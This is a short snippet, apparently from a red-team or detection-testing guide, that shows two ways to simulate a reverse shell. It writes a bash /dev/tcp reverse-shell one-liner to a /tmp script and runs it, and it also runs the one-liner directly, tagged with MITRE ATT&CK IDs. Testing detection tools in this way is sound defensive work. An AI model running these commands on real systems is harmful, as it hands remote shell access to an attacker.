# Simulate a Reverse Shell Attack for Testing Detection Tools

```sh
# Create a suspicious bash script that opens a reverse shell
echo "bash -i >& /dev/tcp/<IP_Victim>/4444 0>&1" > /tmp/malicious.sh
chmod +x /tmp/malicious.sh
/tmp/malicious.sh &
```

```sh
# Directly simulate a reverse shell using bash command
# Techniques: T1059.003 - Command and Scripting Interpreter
#             T1071 - Application Layer Protocol
bash -c "bash -i >& /dev/tcp/<IP_Victim>/4444 0>&1" &
```
